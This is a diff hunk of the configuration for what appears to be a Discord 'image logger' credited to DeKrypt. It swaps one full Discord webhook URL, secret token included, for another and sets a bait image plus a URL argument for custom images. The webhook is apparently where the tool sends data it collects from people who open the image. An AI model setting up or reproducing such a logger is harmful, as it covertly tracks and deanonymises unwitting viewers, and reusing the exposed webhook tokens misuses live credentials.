@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1355386410915463320/5jGx41l7Bx0TFUfx-k91nv1DGiHvx9baGaQC49C2WjUTKsulZvrliS_L_bkl6TOfKgIQ",
+    "webhook": "https://discord.com/api/webhooks/1406417613382357172/V9JqCeiTSbV8d0RJADvvaxT1LC7OlgPDv-L22vzrUMZ7dXrhZ-Fqgygk5ALiILThlbs1",
     "image": "https://static.wikia.nocookie.net/friday-night-funkin-fanon/images/a/a4/Packgod.jpeg/revision/latest?cb=20230217220155", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
